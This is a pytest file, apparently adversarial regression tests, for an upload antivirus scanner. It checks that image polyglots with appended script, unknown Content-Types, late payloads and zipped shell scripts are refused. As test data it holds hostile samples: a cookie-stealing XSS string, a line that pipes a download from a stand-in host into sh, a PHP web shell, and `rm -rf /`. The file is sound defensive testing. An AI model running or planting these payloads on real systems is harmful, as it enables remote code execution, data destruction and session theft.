"""Ataque adversarial ao item L7-03-b-antivirus-anexos (turno 3, grupo G6).

Refutação literal do item: "adversário sobe polyglot (imagem+script), zip declarado como pdf, e confere
que o multipart não abre para conteúdo recusado". O polyglot passa: quando o arquivo COMEÇA com uma
assinatura de imagem válida, libmagic devolve exatamente a família declarada e a carga anexada viaja
junto. O docstring de app/varredura_conteudo.py afirma o contrário ("já cobre o polyglot óbvio do
portão") — é essa afirmação que estes testes medem."""

import io
import struct
import zipfile
import zlib

import pytest

from app.varredura_conteudo import ConteudoRecusado, escanear_cabecalho

ITEM = "L7-03-b-antivirus-anexos"

GIF = (
    b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,"
    b"\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
)
JPEG = bytes.fromhex("ffd8ffe000104a46494600010100000100010000") + b"\xff\xd9"


def _png() -> bytes:
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    return (
        b"\x89PNG\r\n\x1a\n"
        + struct.pack(">I", 13)
        + b"IHDR"
        + ihdr
        + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr) & 0xFFFFFFFF)
    )


def _recusa(dados: bytes, content_type: str) -> bool:
    try:
        escanear_cabecalho(dados, content_type)
        return False
    except ConteudoRecusado:
        return True


# CORRIGIDO (16/09/2026, commit a07f6ca17 "Varredura de anexo: polyglot recusado, tipo desconhecido
# nunca desliga o exame, entrega como anexo (L7-03-b)"): a busca de carga executável passou a
# percorrer o corpo inteiro (não só o cabeçalho), então imagem válida + script colado depois é
# recusada. Achado original: arquivo que COMEÇA com GIF/JPEG/PNG válido e carrega script/PHP logo
# depois era aceito porque libmagic devolvia a família declarada.
@pytest.mark.parametrize(
    "nome,dados,content_type",
    [
        ("gif+script", GIF + b"<script>alert(document.cookie)</script>", "image/gif"),
        ("jpeg+shell", JPEG + b"\n#!/bin/sh\ncurl http://exemplo.invalido | sh\n", "image/jpeg"),
        ("png+php", _png() + b"<?php system($_GET['c']); ?>", "image/png"),
    ],
)
def test_polyglot_imagem_mais_script_precisa_ser_recusado(nome, dados, content_type):
    assert _recusa(dados, content_type), f"polyglot {nome} aceito sob {content_type}"


# CORRIGIDO (16/09/2026, commit a07f6ca17 "Varredura de anexo: polyglot recusado, tipo desconhecido
# nunca desliga o exame, entrega como anexo (L7-03-b)"): Content-Type fora da tabela deixou de
# significar "não examinar" e passou a receber rigor máximo. Achado original:
# TIPOS_PERMITIDOS.get(declarado, None) devolvia None para qualquer tipo fora da tabela, e isso
# desligava a varredura inteira — quem escolhia se ela rodava era o remetente.
@pytest.mark.parametrize("content_type", ["text/html", "application/x-inventado", "", "text/plain"])
def test_content_type_fora_da_tabela_nao_pode_desligar_a_varredura(content_type):
    assert _recusa(b"#!/bin/sh\nrm -rf /\n", content_type), (
        f"script aceito sob Content-Type '{content_type}': tipo desconhecido vira 'não examinar'"
    )


# CORRIGIDO (16/09/2026, commit a07f6ca17 "Varredura de anexo: polyglot recusado, tipo desconhecido
# nunca desliga o exame, entrega como anexo (L7-03-b)"): a busca de carga passou a percorrer o
# corpo inteiro, não só os primeiros 8 KiB (CABECALHO_BYTES). Achado original: um CSV válido de
# 9 KiB com carga depois do limite passava sem exame do que importava.
def test_carga_depois_de_8_kib_precisa_ser_examinada():
    dados = b"a,b\n" + b"1,2\n" * 2200 + b"#!/bin/sh\nrm -rf /\n"
    assert len(dados) > 8192
    assert _recusa(dados, "text/csv"), "carga além de 8 KiB nunca é olhada"


# CORRIGIDO (16/09/2026, commit a07f6ca17 "Varredura de anexo: polyglot recusado, tipo desconhecido
# nunca desliga o exame, entrega como anexo (L7-03-b)"): contêiner composto (kmz/zip) passou a ser
# aberto entrada por entrada; entrada com extensão executável ou shebang recusa o pacote inteiro.
# Achado original: um zip com script dentro passava como 'application/zip', a família declarada.
def test_zip_com_script_dentro_precisa_ser_recusado():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("carga.sh", "#!/bin/sh\nrm -rf /\n")
    assert _recusa(buf.getvalue(), "application/vnd.google-earth.kmz")


def test_o_que_aguentou_script_puro_declarado_como_jpeg_e_recusado():
    """Não é refutação: a cláusula literal do portão fixado em 06/09 funciona. Fica registrada."""
    assert _recusa(b"#!/bin/sh\necho oi\n", "image/jpeg")
